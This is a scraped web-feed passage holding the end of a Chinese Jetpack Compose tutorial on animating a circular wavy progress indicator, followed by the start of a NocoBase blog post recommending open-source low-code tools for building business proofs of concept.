    <span class="hljs-keyword">val</span> density = LocalDensity.current

    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> amplitudePx = with(density) { amplitude.toPx() }
    <span class="hljs-keyword">val</span> wavelengthPx = with(density) { wavelength.toPx() }
    <span class="hljs-keyword">val</span> gapSizePx = with(density) { gapSize.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>
        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span> - amplitudePx

        <span class="hljs-comment">// 物理弧长 = 视觉间隙 + 画笔(笔触)宽度</span>
        <span class="hljs-keyword">val</span> effectiveGapLength = gapSizePx + maxStroke
        <span class="hljs-comment">// 将弧长转换为角度</span>
        <span class="hljs-keyword">val</span> gapAngle = Math.toDegrees((effectiveGapLength / baseRadius).toDouble()).toFloat()

        <span class="hljs-comment">// --- 绘制波浪 ---</span>
        wavePath.rewind()
        <span class="hljs-keyword">val</span> circumference = <span class="hljs-number">2</span> * PI * baseRadius
        <span class="hljs-keyword">val</span> frequency = circumference / wavelengthPx
        <span class="hljs-keyword">val</span> endAngle = <span class="hljs-number">180f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())
            <span class="hljs-keyword">val</span> waveOffset = amplitudePx * sin((rad * frequency))
            <span class="hljs-keyword">val</span> r = baseRadius + waveOffset

            <span class="hljs-keyword">val</span> x = center.x + (r * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (r * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) wavePath.moveTo(x, y) <span class="hljs-keyword">else</span> wavePath.lineTo(x, y)
        }
        drawPath(
            path = wavePath,
            color = waveColor,
            style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
        )

        <span class="hljs-comment">// --- 绘制轨道 ---</span>
        trackPath.rewind()

        <span class="hljs-comment">// 轨道起点 = 波浪终点 + 间隙角度</span>
        <span class="hljs-keyword">val</span> trackStartAngle = endAngle + gapAngle
        <span class="hljs-comment">// 轨道终点 = 360度 - 间隙角度</span>
        <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span> - gapAngle

        <span class="hljs-comment">// 只有当剩余空间足够时才绘制轨道</span>
        <span class="hljs-keyword">if</span> (trackStartAngle &lt; trackEndAngle) {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
                <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
                <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())
                <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
                <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

                <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) trackPath.moveTo(x, y) <span class="hljs-keyword">else</span> trackPath.lineTo(x, y)
            }
            drawPath(
                path = trackPath,
                color = trackColor,
                style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
            )
        }
    }
}
</code></pre>
<p>运行效果：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6c2d7968061460fbc95aa109d802105~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=28O%2FCozWx9mBvlYvhets%2BDvyOtA%3D" alt="image.png" width="50%" loading="lazy"/>
<h3 data-id="heading-5">添加动画</h3>
<p>最后，我们来让这个进度条动起来。我们需要三个维度的动画：</p>
<ul>
<li>
<p><strong>SweepAngle(呼吸)</strong>：控制波浪进度条的长短。我们使用了 <code>keyframes</code>，实现了波浪慢吸快呼的非线性节奏。</p>
</li>
<li>
<p><strong>Rotation(自转)</strong>：控制整个圆环的旋转。我们自定义了贝塞尔曲线，实现了脉冲式的旋转。</p>
</li>
<li>
<p><strong>PhaseShift(流动)</strong>：控制波浪的流动。通过改变波的相位偏移来实现的，这样即使圆环整体不转，波浪看起来也像在向前流动。</p>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep4</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary,
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer,
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    amplitude: <span class="hljs-type">Dp</span> = <span class="hljs-number">1.2</span>.dp,
    wavelength: <span class="hljs-type">Dp</span> = <span class="hljs-number">15.</span>dp,
    gapSize: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    cycleDuration: <span class="hljs-type">Int</span> = <span class="hljs-number">1500</span>, <span class="hljs-comment">// 整体旋转周期</span>
    waveFlowDuration: <span class="hljs-type">Int</span> = <span class="hljs-number">3000</span> <span class="hljs-comment">// 波浪流动周期</span>
)</span></span> {
    <span class="hljs-keyword">val</span> infiniteTransition = rememberInfiniteTransition(label = <span class="hljs-string">"WavyTransition"</span>)

    <span class="hljs-comment">// 呼吸动画: 使用 keyframes 实现非对称的伸缩</span>
    <span class="hljs-keyword">val</span> sweepAngle <span class="hljs-keyword">by</span> infiniteTransition.animateFloat(
        initialValue = <span class="hljs-number">30f</span>,
        targetValue = <span class="hljs-number">30f</span>,
        animationSpec = infiniteRepeatable(
            animation = keyframes {
                durationMillis = <span class="hljs-number">5000</span>
                <span class="hljs-comment">// 3秒内缓慢张开</span>
                <span class="hljs-number">300f</span> at <span class="hljs-number">3000</span> using CubicBezierEasing(<span class="hljs-number">.42f</span>, <span class="hljs-number">0f</span>, <span class="hljs-number">1f</span>, <span class="hljs-number">1f</span>)
                <span class="hljs-comment">// 2秒内快速收缩</span>
                <span class="hljs-number">30f</span> at <span class="hljs-number">5000</span> using FastOutSlowInEasing
            },
            repeatMode = RepeatMode.Restart
        ),
        label = <span class="hljs-string">"SweepAngle"</span>
    )

    <span class="hljs-comment">// 自转动画: 整体旋转</span>
    <span class="hljs-keyword">val</span> rotation <span class="hljs-keyword">by</span> infiniteTransition.animateFloat(
        initialValue = <span class="hljs-number">0f</span>,
        targetValue = <span class="hljs-number">360f</span>,
        animationSpec = infiniteRepeatable(
            animation = tween(cycleDuration, easing = CubicBezierEasing(<span class="hljs-number">0.33f</span>, <span class="hljs-number">1f</span>, <span class="hljs-number">0.68f</span>, <span class="hljs-number">1f</span>)),
        ),
        label = <span class="hljs-string">"Rotation"</span>
    )

    <span class="hljs-comment">// 相位流动动画: 控制波浪纹理移动</span>
    <span class="hljs-keyword">val</span> phaseShift <span class="hljs-keyword">by</span> infiniteTransition.animateFloat(
        initialValue = <span class="hljs-number">0f</span>,
        targetValue = (<span class="hljs-number">2</span> * PI).toFloat(), <span class="hljs-comment">// 移动一个完整波长，实现无缝循环</span>
        animationSpec = infiniteRepeatable(
            animation = tween(waveFlowDuration, easing = LinearEasing)
        ),
        label = <span class="hljs-string">"PhaseShift"</span>
    )

    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }
    <span class="hljs-keyword">val</span> density = LocalDensity.current

    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> amplitudePx = with(density) { amplitude.toPx() }
    <span class="hljs-keyword">val</span> wavelengthPx = with(density) { wavelength.toPx() }
    <span class="hljs-keyword">val</span> gapSizePx = with(density) { gapSize.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>
        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span> - amplitudePx
        <span class="hljs-keyword">val</span> effectiveGapLength = gapSizePx + maxStroke
        <span class="hljs-keyword">val</span> gapAngle = Math.toDegrees((effectiveGapLength / baseRadius).toDouble()).toFloat()

        <span class="hljs-comment">// 使用 rotate 旋转整个画布</span>
        rotate(rotation) {
            <span class="hljs-comment">// --- 绘制波浪 ---</span>
            wavePath.rewind()
            <span class="hljs-keyword">val</span> circumference = <span class="hljs-number">2</span> * PI * baseRadius
            <span class="hljs-keyword">val</span> frequency = circumference / wavelengthPx
            <span class="hljs-comment">// 结束角度由动画控制</span>
            <span class="hljs-keyword">val</span> endAngle = sweepAngle

            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
                <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
                <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

                <span class="hljs-comment">// 将 phaseShift 加到正弦函数中，实现波浪流动</span>
                <span class="hljs-keyword">val</span> waveOffset = amplitudePx * sin((rad * frequency) + phaseShift)
                <span class="hljs-keyword">val</span> r = baseRadius + waveOffset

                <span class="hljs-keyword">val</span> x = center.x + (r * cos(rad)).toFloat()
                <span class="hljs-keyword">val</span> y = center.y + (r * sin(rad)).toFloat()

                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) wavePath.moveTo(x, y) <span class="hljs-keyword">else</span> wavePath.lineTo(x, y)
            }
            drawPath(
                path = wavePath,
                color = waveColor,
                style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
            )

            <span class="hljs-comment">// --- 绘制轨道 ---</span>
            trackPath.rewind()
            <span class="hljs-keyword">val</span> trackStartAngle = sweepAngle + gapAngle
            <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span> - gapAngle

            <span class="hljs-keyword">if</span> (trackStartAngle &lt; trackEndAngle) {
                <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
                    <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
                    <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())
                    <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
                    <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

                    <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) trackPath.moveTo(
                        x,
                        y
                    ) <span class="hljs-keyword">else</span> trackPath.lineTo(x, y)
                }
                drawPath(
                    path = trackPath,
                    color = trackColor,
                    style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
                )
            }
        }
    }
}
</code></pre>
<p>以上就是最终的完整代码了，可以直接复制使用，当然你可以重命名为 <code>CircularWavyProgressIndicator</code>。</p>
<blockquote>
<p>关于 Transition，可以看我的这篇博客：</p>
<ul>
<li><a href="https://juejin.cn/post/7502364800992165903" target="_blank" title="https://juejin.cn/post/7502364800992165903">深入理解 Transition：更强大的动画管理</a></li>
</ul>
<p>关于贝塞尔曲线，可以看我的这篇博客：</p>
<ul>
<li><a href="https://juejin.cn/post/7494836622497939507" target="_blank" title="https://juejin.cn/post/7494836622497939507">AnimationSpec动画规格详解</a></li>
</ul>
</blockquote>
<p>运行效果：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02d6503cc0e94e62aff9dd5c8c648525~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=H%2BN2zTo%2FahWNs4TIaAUqBd0Ep8g%3D" alt="Screen_recording_20251124_204245.gif" width="50%" loading="lazy"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[6个适合做 PoC 的开源无代码/低代码工具推荐]]></title>    <link>https://juejin.cn/post/7576105458807537664</link>    <guid>https://juejin.cn/post/7576105458807537664</guid>    <pubDate>2025-11-24T14:20:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576105458807537664" data-draft-id="7576175307356717091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="6个适合做 PoC 的开源无代码/低代码工具推荐 "/> <meta itemprop="keywords" content="开源,低代码,敏捷开发"/> <meta itemprop="datePublished" content="2025-11-24T14:20:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NocoBase"/> <meta itemprop="url" content="https://juejin.cn/user/180779873743566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            6个适合做 PoC 的开源无代码/低代码工具推荐 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180779873743566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NocoBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:20:37.000Z" title="Mon Nov 24 2025 14:20:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F6-open-source-no-low-code-tools-for-building-pocs" target="_blank" title="https://www.nocobase.com/cn/blog/6-open-source-no-low-code-tools-for-building-pocs" ref="nofollow noopener noreferrer">www.nocobase.com/cn/blog/6-o…</a></p>
<p>如果在几年前你问一位产品经理或技术负责人：“最快完成一个 PoC 的方式是什么？”，大多数人都会给出类似的答案——选择一个合适的低代码或无代码平台，把业务流程、界面和基础逻辑快速搭建起来，使想法尽快进入可运行的状态。</p>
<p>但在过去两年里，AI 的快速发展也让这种判断开始发生变化。如今，模型能够根据自然语言生成前端代码、组件结构，甚至能根据草图生成完整页面。界面的生成速度显著提升，一部分前端工作已经可以由 AI 自动完成。近期推出的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2F" target="_blank" title="https://gemini.google.com/" ref="nofollow noopener noreferrer">Gemini 3</a> 在代码生成、布局理解和交互逻辑补全方面进一步增强，整个前端设计的过程也变得更直接、更可控。</p>
<blockquote>
<p>既然 AI 已经能够提供可用且美观的界面，我们为什么仍然需要低代码或无代码平台来完成 PoC？</p>
</blockquote>
<p>两者解决的问题并不相同。</p>
<p>AI 主要负责生成界面和结构，但 PoC 的关键不在界面本身，而在于支撑它运行的基础能力，例如数据持久化、业务规则、权限管理、跨系统集成等。这些能力决定了一个 PoC 是否能够准确模拟业务流程，而不仅仅是展示画面的组合。</p>
<p>低代码／无代码平台的作用就是帮助团队快速连接数据、执行业务逻辑、配置角色与流程，并在需要时将 PoC 扩展为正式系统。</p>
<p>在实际的验证阶段，这些功能都是 AI 目前无法单独承担的。</p>
<hr/>
<p>💬 嗨！你正在阅读 NocoBase 博客。NocoBase 是一个极易扩展的 AI 无代码/低代码开发平台，用于构建企业应用、内部工具和各类系统。它完全支持自托管，基于插件架构设计，开发者友好。→ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase" target="_blank" title="https://github.com/nocobase/nocobase" ref="nofollow noopener noreferrer">欢迎在 GitHub 上了解我们</a></p>
<hr/>
<p>基于这些观察，我们整理了 <strong>6 个适合做 PoC 的开源无代码／低代码工具</strong>，介绍了它们适用的场景、亮点与使用建议，希望能帮助你在项目探索阶段快速找到合适的起步工具。</p>
<h2 data-id="heading-0">NocoBase</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fde8049a4ec429887be55bec41ddea8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=cGCQwLESmhw2vA0srhSlH10RO2k%3D" alt="nocobase.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase" target="_blank" title="https://github.com/nocobase/nocobase" ref="nofollow noopener noreferrer">github.com/nocobase/no…</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>20k</td></tr><tr><td>官网</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2F" target="_blank" title="https://www.nocobase.com/" ref="nofollow noopener noreferrer">www.nocobase.com/</a></td></tr><tr><td>文档</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fv2.docs.nocobase.com%2Fcn%2F" target="_blank" title="https://v2.docs.nocobase.com/cn/" ref="nofollow noopener noreferrer">v2.docs.nocobase.com/cn/</a></td></tr></tbody></table>
<p>NocoBase 是一个开源、自部署且插件化的低代码／无代码平台，专为构建业务系统和内部工具设计。</p>
<p>在官方发布的案例中，ED 团队使用 NocoBase 在短时间内完成多个内部系统的 PoC，并在验证成功后快速扩展为正式产品，包括 CRM、运营后台和项目管理等模块。ED 工程师们认为，NocoBase 改变了他们的开发方式。可视化建模、自动 CRUD、灵活工作流与自动生成 API，让开发者摆脱了重复劳动，高效直达业务目标。QA 与用户的反馈周期大幅缩短，项目能更快进入生产。</p>
<p>💡阅读更多：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fed" target="_blank" title="https://www.nocobase.com/cn/blog/ed" ref="nofollow noopener noreferrer">NocoBase 如何成为 ED 的技术底座，支撑内部系统到商业化产品？</a></p>
<p><strong>适合的使用场景</strong></p>
<ul>
<li>当你需要快速搭建一个包含数据模型、操作界面、流程逻辑的内部系统，例如员工管理、订单处理、或客户服务后台。</li>
<li>有多个用户角色、复杂权限控制需求，以及需要接口整合外部系统或数据源的应用场合。</li>
<li>NocoBase 支持自部署，并提供可扩展的插件机制，适合需要在内部环境中运行系统、并保持架构灵活度的团队。</li>
</ul>
<p><strong>亮点与使用建议</strong></p>
<ul>
<li><strong>数据模型驱动</strong>：与传统从表单／表格开始不同，NocoBase 采用 “数据模型先于界面” 的方式，你可以先定义业务对象、关系、字段，再搭建页面和流程，这种方式更适合后续的扩展。</li>
<li><strong>细粒度权限与流程支持</strong>：它提供从系统、数据到字段的权限控制。在 PoC 阶段可以为不同角色快速设定访问界面与数据权限。</li>
<li><strong>插件化架构与扩展能力</strong>：功能基于插件体系构建，数据源、动作、字段类型、界面组件等都可以通过插件扩展。PoC 阶段可以先使用内置插件快速搭建应用，再根据需求逐步替换或扩展。</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fv2.docs.nocobase.com%2Fai-employees%2F" target="_blank" title="https://v2.docs.nocobase.com/ai-employees/" ref="nofollow noopener noreferrer">AI 员工</a></strong>：AI 员工嵌入系统界面，可以自动读取当前页面的数据模型与结构，并在对应位置直接协助完成建模、数据处理或 JavaScript 编写等任务。 在 PoC 阶段，你可以先搭建核心数据模型与页面框架，然后用 AI 员工辅助生成字段和初步布局，从而节省初次搭建的时间，把团队精力更多集中在验证业务流程与用户场景上。</li>
</ul>
<h2 data-id="heading-1">Budibase</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9739a3999a84cd8af1d0934d3f0a8a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=juYsBFKDzsljxxyLblEg1VVIFvg%3D" alt="Budibase.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBudibase%2Fbudibase" target="_blank" title="https://github.com/Budibase/budibase" ref="nofollow noopener noreferrer">github.com/Budibase/bu…</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>27.3k</td></tr><tr><td>官网</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fbudibase.com%2F" target="_blank" title="https://budibase.com/" ref="nofollow noopener noreferrer">budibase.com/</a></td></tr><tr><td>文档</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.budibase.com%2Fdocs%2F" target="_blank" title="https://docs.budibase.com/docs/" ref="nofollow noopener noreferrer">docs.budibase.com/docs/</a></td></tr></tbody></table>
<p>Budibase 是一个开源低代码平台，提供可自托管、可扩展的内部系统基础能力，包括数据连接、业务逻辑执行、权限配置与自动化工作流。</p>
<p><strong>适合的使用场景</strong></p>
<ul>
<li>构建需要数据持久化、表单处理、审批链路或后台管理能力的企业内部应用，如资产管理、员工流程、客户门户等。</li>
<li>当 PoC 需要整合多个数据源（PostgreSQL、MySQL、MongoDB、REST API 等），并希望在同一平台内完成数据层、逻辑层与自动化，而不是依赖纯前端代码生成。</li>
</ul>
<p><strong>亮点与使用建议</strong></p>
<ul>
<li><strong>多数据源与可自托管能力</strong>：支持 PostgreSQL、MySQL、MongoDB、REST API 等连接方式，并可通过 Docker 或 Kubernetes 进行部署，适合需要真实模拟业务数据结构的 PoC。</li>
<li><strong>业务逻辑与自动化流程</strong>：自带 Automations 工作流，可在数据变更、触发事件或外部 API 调用时执行逻辑，这部分是 PoC 验证业务规则的关键能力。</li>
<li><strong>权限与角色体系</strong>：支持用户、角色、资源级权限管理，在 PoC 阶段即可验证真实的访问控制与分工模型。</li>
</ul>
<p>💡阅读更多：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F6-no-code-tools-supporting-postgresql" target="_blank" title="https://www.nocobase.com/cn/blog/6-no-code-tools-supporting-postgresql" ref="nofollow noopener noreferrer">PostgreSQL 用户必看：6 款强大的无代码平台推荐 </a></p>
<h2 data-id="heading-2">Appsmith</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2b3b0db0b10428ebe3bf114ab8c7bed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=np13CVF6Ck5CvCIItgpIzS4pe%2Bg%3D" alt="Appsmith.png" loading="lazy"/></p>





















